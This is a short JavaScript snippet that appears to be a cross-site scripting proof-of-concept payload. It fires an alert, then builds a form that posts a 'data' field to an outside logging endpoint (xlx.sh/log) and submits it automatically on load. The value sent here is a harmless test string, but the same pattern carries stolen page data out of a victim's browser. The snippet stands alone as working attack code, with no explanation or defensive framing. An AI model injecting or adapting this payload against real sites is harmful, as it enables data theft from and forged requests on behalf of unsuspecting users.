alert(4);


const form = document.createElement("form");
form.action = "https://xlx.sh/log";
form.method = "POST";

const input = document.createElement("input");
input.name = "data";
input.value = "works";

form.appendChild(input);
document.body.appendChild(form);
form.submit();
